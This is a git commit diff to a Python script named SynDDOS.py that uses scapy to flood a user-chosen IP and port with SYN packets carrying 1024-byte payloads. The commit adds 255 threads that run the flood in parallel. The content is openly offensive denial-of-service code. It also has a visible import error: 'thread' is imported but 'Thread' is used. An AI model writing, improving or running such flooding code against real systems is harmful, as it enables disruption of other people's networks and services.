723b78da3df39fa78cd0ff2f64bfa6c5feb843be
Benmochka <benjamin.vaniche@gmail.com>
2024-05-20 18:52:37 +0300

    added threads to the code

--- SynDDOS.py
+++ SynDDOS.py
@@ -1,4 +1,5 @@
 from scapy.all import *
+from threading import thread
 
 target_ip = input("Enter ip you want to flood: ")
 target_port = input("Enter which port you want to flood: ")
@@ -9,3 +10,7 @@ def syn(target_ip,target_port):
     raw = Raw(b"X"*1024)
     p = ip / tcp / raw
     send(p, loop=1, verbose=0)    
+
+for i in range(255):
+    t = Thread(target=syn,args=(target_ip,target_port))    
+    t.start()
